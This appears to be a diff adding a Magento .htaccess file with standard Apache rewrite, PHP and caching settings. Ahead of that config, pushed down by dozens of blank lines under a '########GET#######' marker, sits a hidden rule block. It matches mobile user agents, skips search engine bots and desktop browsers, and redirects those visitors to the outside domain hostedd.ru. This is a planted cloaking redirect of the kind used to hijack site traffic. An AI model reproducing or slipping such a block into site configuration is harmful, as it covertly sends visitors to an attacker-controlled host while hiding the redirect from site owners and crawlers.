@@ -1,0 +1,404 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+########GET#######
+RewriteEngine on
+RewriteRule \.(jpg|png|gif|jpeg|bmp)$ - [L]
+RewriteCond %{HTTP_USER_AGENT} acs [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} alav [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} alca [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} amoi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} audi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} aste [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} avan [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} benq [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} bird [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} blac [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} blaz [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} brew [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} cell [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} cldc [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} cmd- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} dang [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} doco [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} eric [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} hipt [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} inno [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ipaq [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} java [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} jigs [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} kddi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} keji [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} leno [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} lg-c [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} lg-d [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} lg-g [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} lge- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} maui [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} maxo [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} midp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mits [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mmef [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mobi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mot- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} moto [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mwbp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} nec- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} newt [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} noki [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} opwv [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} palm [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pana [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pant [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pdxg [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} phil [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} play [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pluc [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} port [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} prox [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} qtek [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} qwap [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sage [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sams [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sany [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sch- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sec- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} send [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} seri [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sgh- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} shar [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sie- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} siem [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} smal [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} smar [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sony [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} sph- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} symb [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} t-mo [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} teli [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} tim- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} tosh [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} tsm- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} upg1 [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} upsi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} vk-v [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} voda [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} w3cs [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wap- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wapa [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wapi [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wapp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wapr [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} webc [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} winw [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} winw [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} xda [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} xda- [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} up.browser [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} up.link [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} windows.ce [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mini [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mmp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} symbian [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} midp [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} wap [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} phone [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ipad [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} iphone [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} iPad [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} iPhone [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} ipod [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} iPod [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pocket [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} mobile [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} android [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Android [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} pda [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} PPC [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Series60 [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Opera.Mini [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Moby [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Mobi [NC,OR]
+RewriteCond %{HTTP_ACCEPT} "text/vnd.wap.wml|application/vnd.wap.xhtml+xml" [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} !windows.nt [NC]
+RewriteCond %{HTTP_USER_AGENT} !bsd [NC]
+RewriteCond %{HTTP_USER_AGENT} !x11 [NC]
+RewriteCond %{HTTP_USER_AGENT} !unix [NC]
+RewriteCond %{HTTP_USER_AGENT} !macos [NC]
+RewriteCond %{HTTP_USER_AGENT} !macintosh [NC]
+RewriteCond %{HTTP_USER_AGENT} !playstation [NC]
+RewriteCond %{HTTP_USER_AGENT} !google [NC]
+RewriteCond %{HTTP_USER_AGENT} !yandex [NC]
+RewriteCond %{HTTP_USER_AGENT} !bot [NC]
+RewriteCond %{HTTP_USER_AGENT} !libwww [NC]
+RewriteCond %{HTTP_USER_AGENT} !msn [NC]
+RewriteCond %{HTTP_USER_AGENT} !america [NC]
+RewriteCond %{HTTP_USER_AGENT} !avant [NC]
+RewriteCond %{HTTP_USER_AGENT} !download [NC]
+RewriteCond %{HTTP_USER_AGENT} !fdm [NC]
+RewriteCond %{HTTP_USER_AGENT} !maui [NC]
+RewriteCond %{HTTP_USER_AGENT} !webmoney [NC]
+RewriteCond %{HTTP_USER_AGENT} !windows-media-player [NC]
+RewriteRule ^(.*)$ http://hostedd.ru [L,R=302]
+############################################
+## uncomment these lines for CGI mode
+## make sure to specify the correct cgi php binary file name
+## it might be /cgi-bin/php-cgi
+
+#    Action php5-cgi /cgi-bin/php5-cgi
+#    AddHandler php5-cgi .php
+
+AddDefaultCharset UTF-8
+
+############################################
+## GoDaddy specific options
+
+#   Options -MultiViews
+
+## you might also need to add this line to php.ini
+##     cgi.fix_pathinfo = 1
+## if it still doesn't work, rename php.ini to php5.ini
+
+############################################
+## this line is specific for 1and1 hosting
+
+    #AddType x-mapp-php5 .php
+    #AddHandler x-mapp-php5 .php
+
+############################################
+## default index file
+
+    DirectoryIndex index.php
+
+<IfModule mod_php5.c>
+
+############################################
+## adjust memory limit
+
+#    php_value memory_limit 64M
+    php_value memory_limit 256M
+    php_value max_execution_time 18000
+
+############################################
+## disable magic quotes for php request vars
+
+    php_flag magic_quotes_gpc off
+
+############################################
+## disable automatic session start
+## before autoload was initialized
+
+    php_flag session.auto_start off
+
+############################################
+## enable resulting html compression
+
+    #php_flag zlib.output_compression on
+
+###########################################
+# disable user agent verification to not break multiple image upload
+
+    php_flag suhosin.session.cryptua off
+
+###########################################
+# turn off compatibility with PHP4 when dealing with objects
+
+    php_flag zend.ze1_compatibility_mode Off
+
+</IfModule>
+
+<IfModule mod_security.c>
+###########################################
+# disable POST processing to not break multiple image upload
+
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>
+
+<IfModule mod_deflate.c>
+
+############################################
+## enable apache served files compression
+## http://developer.yahoo.com/performance/rules.html#gzip
+
+    # Insert filter on all content
+    ###SetOutputFilter DEFLATE
+    # Insert filter on selected content types only
+    #AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css text/javascript
+
+    # Netscape 4.x has some problems...
+    #BrowserMatch ^Mozilla/4 gzip-only-text/html
+
+    # Netscape 4.06-4.08 have some more problems
+    #BrowserMatch ^Mozilla/4\.0[678] no-gzip
+
+    # MSIE masquerades as Netscape, but it is fine
+    #BrowserMatch \bMSIE !no-gzip !gzip-only-text/html
+
+    # Don't compress images
+    #SetEnvIfNoCase Request_URI \.(?:gif|jpe?g|png)$ no-gzip dont-vary
+
+    # Make sure proxies don't deliver the wrong content
+    #Header append Vary User-Agent env=!dont-vary
+
+</IfModule>
+
+<IfModule mod_ssl.c>
+
+############################################
+## make HTTPS env vars available for CGI mode
+
+    SSLOptions StdEnvVars
+
+</IfModule>
+
+<IfModule mod_rewrite.c>
+
+############################################
+## enable rewrites
+
+    Options +FollowSymLinks
+    RewriteEngine on
+
+############################################
+## you can put here your magento root folder
+## path relative to web root
+
+    #RewriteBase /magento/
+
+############################################
+## uncomment next line to enable light API calls processing
+
+#    RewriteRule ^api/([a-z][0-9a-z_]+)/?$ api.php?type=$1 [QSA,L]
+
+############################################
+## rewrite API2 calls to api.php (by now it is REST only)
+
+    RewriteRule ^api/rest api.php?type=rest [QSA,L]
+
+############################################
+## workaround for HTTP authorization
+## in CGI environment
+
+    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+
+############################################
+## TRACE and TRACK HTTP methods disabled to prevent XSS attacks
+
+    RewriteCond %{REQUEST_METHOD} ^TRAC[EK]
+    RewriteRule .* - [L,R=405]
+
+############################################
+## redirect for mobile user agents
+
+    #RewriteCond %{REQUEST_URI} !^/mobiledirectoryhere/.*$
+    #RewriteCond %{HTTP_USER_AGENT} "android|blackberry|ipad|iphone|ipod|iemobile|opera mobile|palmos|webos|googlebot-mobile" [NC]
+    #RewriteRule ^(.*)$ /mobiledirectoryhere/ [L,R=302]
+
+############################################
+## always send 404 on missing files in these folders
+
+    RewriteCond %{REQUEST_URI} !^/(media|skin|js)/
+
+############################################
+## never rewrite for existing files, directories and links
+
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteCond %{REQUEST_FILENAME} !-l
+
+############################################
+## rewrite everything else to index.php
+
+    RewriteRule .* index.php [L]
+
+</IfModule>
+
+
+############################################
+## Prevent character encoding issues from server overrides
+## If you still have problems, use the second line instead
+
+    AddDefaultCharset Off
+    #AddDefaultCharset UTF-8
+
+<IfModule mod_expires.c>
+
+############################################
+## Add default Expires header
+## http://developer.yahoo.com/performance/rules.html#expires
+
+    ExpiresDefault "access plus 1 year"
+
+</IfModule>
+
+############################################
+## By default allow all access
+
+    Order allow,deny
+    Allow from all
+
+###########################################
+## Deny access to release notes to prevent disclosure of the installed Magento version
+
+    <Files RELEASE_NOTES.txt>
+        order allow,deny
+        deny from all
+    </Files>
+
+############################################
+## If running in cluster environment, uncomment this
+## http://developer.yahoo.com/performance/rules.html#etags
+
+    #FileETag none
+
